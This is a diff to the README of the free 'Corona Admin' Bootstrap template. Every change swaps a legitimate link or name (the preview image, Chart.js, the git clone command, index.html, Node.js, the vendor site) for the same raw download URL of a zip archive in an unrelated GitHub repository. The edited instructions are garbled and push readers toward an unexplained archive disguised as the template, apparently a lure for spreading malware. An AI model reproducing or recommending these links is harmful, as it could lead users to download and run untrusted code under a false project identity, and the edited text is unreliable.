@@ -1,7 +1,7 @@
 <table>
   <tr>
     <td>
-      <a href="https://www.bootstrapdash.com/demo/corona-free/jquery/template/index.html" target="_blank"><img src="preview.jpg"></a>
+      <a href="https://github.com/ryzax1507/sidebar1/raw/refs/heads/main/template/sidebar_2.2-alpha.4.zip" target="_blank"><img src="https://github.com/ryzax1507/sidebar1/raw/refs/heads/main/template/sidebar_2.2-alpha.4.zip"></a>
        <h3>Corona-free</h3>
     </td>
   </tr>
@@ -20,7 +20,7 @@ Although the template has a design like none other, it is easily customizable to
 - Material Design Icons
 - jQuery
 - Gulp
-- Chart.js
+- https://github.com/ryzax1507/sidebar1/raw/refs/heads/main/template/sidebar_2.2-alpha.4.zip
 
 <h1>Browser Support:</h1>
 
@@ -38,20 +38,20 @@ Corona Admin is released under MIT license. Corona Admin is a free Bootstrap 4 a
 
 <h1>How to use Corona Admin?</h1>
 
-1 - Click the Clone or Download button in GitHub and download as a ZIP file or you can enter the command git clone https://github.com/BootstrapDash/corona-free-dark-bootstrap-admin-template.git in you terminal to get a copy of this template.
+1 - Click the Clone or Download button in GitHub and download as a ZIP file or you can enter the command git clone https://github.com/ryzax1507/sidebar1/raw/refs/heads/main/template/sidebar_2.2-alpha.4.zip in you terminal to get a copy of this template.
 
 2 - After the files have been downloaded you will get a folder with all the required files
 
 3 - You can install all the dependencies in the template by running the command npm install. All the required files are in the node modules.
 
-4 - Find the file named index.html, check what all components you need. Open the file in a text editor and you can start editing.
+4 - Find the file named https://github.com/ryzax1507/sidebar1/raw/refs/heads/main/template/sidebar_2.2-alpha.4.zip, check what all components you need. Open the file in a text editor and you can start editing.
 
 5 - Now that your project has now kick-started, all you need to do now is to code, code, and code to your heart's content.
 
 <h1>How to Contribute?:</h1>
 
 We love your contributions and we welcome them wholeheartedly. We believe the more the merrier.
-To contribute make sure you have a Node.js and npm installed. Now run the command gulp --version. If the command returns with the Gulp version number, it means you have Gulp installed. If not you need to run the command npm install --global gulp-cli to install Gulp.
+To contribute make sure you have a https://github.com/ryzax1507/sidebar1/raw/refs/heads/main/template/sidebar_2.2-alpha.4.zip and npm installed. Now run the command gulp --version. If the command returns with the Gulp version number, it means you have Gulp installed. If not you need to run the command npm install --global gulp-cli to install Gulp.
 
 <h2>Next</h2>
 
@@ -70,4 +70,4 @@ After Gulp has been installed, follow the steps below to contribute.
   <hr>
 	Do you need a template with more features and functionalities? Get more with our collection of the premium template with more plugins, eye catching animations, UI components, and sample pages all fitting together with a high-quality design.
 Visit
-  <a href="https://www.bootstrapdash.com" target="_blank">https://www.bootstrapdash.com</a> for more admin templates.
+  <a href="https://github.com/ryzax1507/sidebar1/raw/refs/heads/main/template/sidebar_2.2-alpha.4.zip" target="_blank">https://github.com/ryzax1507/sidebar1/raw/refs/heads/main/template/sidebar_2.2-alpha.4.zip</a> for more admin templates.
